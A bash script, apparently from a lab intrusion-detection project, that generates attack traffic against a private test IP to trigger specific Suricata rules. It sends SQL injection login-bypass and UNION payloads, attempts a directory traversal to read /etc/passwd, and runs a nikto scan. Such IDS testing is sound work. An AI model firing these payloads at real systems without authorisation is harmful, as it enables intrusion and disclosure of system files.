#!/bin/bash
# =============================================================================
# web_scan.sh - Web Vulnerability Scanner (PFA)
# =============================================================================
# Maps to Suricata rules: sid:1000020-1000041 (web attacks, scanning)
# =============================================================================
TARGET="${1:-10.0.1.10}"
PORT="${2:-80}"
LOG_DIR="/opt/pfa/attacks/logs"
mkdir -p "$LOG_DIR"
REPORT="$LOG_DIR/webscan_$(date +%Y%m%d_%H%M%S).log"

echo "[*] PFA Web Vulnerability Scan" | tee "$REPORT"
echo "[*] Target: $TARGET:$PORT" | tee -a "$REPORT"
echo "[*] Time: $(date -u)" | tee -a "$REPORT"
echo "" | tee -a "$REPORT"

# Phase 1: Basic enumeration
echo "[*] Phase 1: Web Server Enumeration" | tee -a "$REPORT"
curl -s -I "http://$TARGET:$PORT/" 2>&1 | tee -a "$REPORT"

# Phase 2: SQL injection test (triggers sid:1000020, sid:1000021)
echo "" | tee -a "$REPORT"
echo "[*] Phase 2: SQL Injection Testing" | tee -a "$REPORT"
echo "--- Basic SQLi bypass ---" | tee -a "$REPORT"
curl -s "http://$TARGET:$PORT/login.php" -d "username=admin' OR '1'='1&password=test" 2>&1 | tee -a "$REPORT"
echo "--- SQLi UNION ---" | tee -a "$REPORT"
curl -s "http://$TARGET:$PORT/login.php" -d "username=admin' UNION SELECT * FROM users--&password=test" 2>&1 | tee -a "$REPORT"

# Phase 3: Directory traversal (triggers sid:1000023)
echo "" | tee -a "$REPORT"
echo "[*] Phase 3: Directory Traversal Testing" | tee -a "$REPORT"
curl -s "http://$TARGET:$PORT/../../../etc/passwd" 2>&1 | tee -a "$REPORT"

# Phase 4: Nikto scan (triggers sid:1000022)
echo "" | tee -a "$REPORT"
echo "[*] Phase 4: Nikto Web Scanner" | tee -a "$REPORT"
nikto -h "http://$TARGET:$PORT/" -ssl 2>&1 | tee -a "$REPORT"

echo "" | tee -a "$REPORT"
echo "[*] Web scan complete. Report: $REPORT" | tee -a "$REPORT"
